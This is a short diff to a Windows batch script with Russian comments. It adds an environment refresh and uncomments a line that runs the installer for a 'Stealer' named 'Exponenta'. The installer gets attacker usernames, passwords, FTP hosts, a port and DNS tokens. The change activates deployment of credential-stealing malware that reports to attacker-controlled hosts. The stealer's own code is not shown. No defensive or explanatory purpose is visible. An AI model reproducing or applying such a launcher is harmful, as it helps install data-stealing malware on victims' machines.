@@ -14,7 +14,8 @@ rem set Hacker_Pass=%2
 rem set Hacker_host2=%3
 rem set Hacker_host3=%4
 
-
+rem Обновляем перемсенные окружения
+call "C:\ProgramData\chocolatey\bin\RefreshEnv.cmd"
 
 rem Читаем настройки из файла settings.txt, который должен располагаться в
 rem том же каталоге, что и bat-файл. Если не удалось распарсить настройки -
@@ -25,7 +26,7 @@ rem Go to Temprorary Directory
 cd /d %curdir%
 
 rem Запускаем инсталлятор Stealer "Экспонента"
-rem call install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
+call install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
 cd /d %curdir%
 
 rem Удаляем временный каталог
